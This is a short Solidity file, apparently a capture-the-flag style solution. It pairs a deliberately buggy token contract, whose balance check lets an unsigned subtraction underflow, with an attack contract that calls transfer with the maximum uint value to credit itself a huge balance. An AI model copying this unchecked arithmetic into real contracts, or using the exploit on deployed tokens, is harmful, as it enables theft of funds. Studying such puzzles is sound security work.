pragma solidity ^0.4.24;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}



contract TokenAttack {

    Token victim;

    constructor(address _victim) public {
        victim = Token(_victim);
    }

    //the vulnerability is in the assumption that require(balances[msg.sender] - _value >= 0);
    //will revert if the caller has no balance when it only checks if the value of
    //balances[msg.sender] - _value is equal or bigger than 0, however we can cause an overflow 
    function attack() external returns(bool success) {
        victim.transfer(msg.sender, uint256(0-1));
        return success;
    }

}
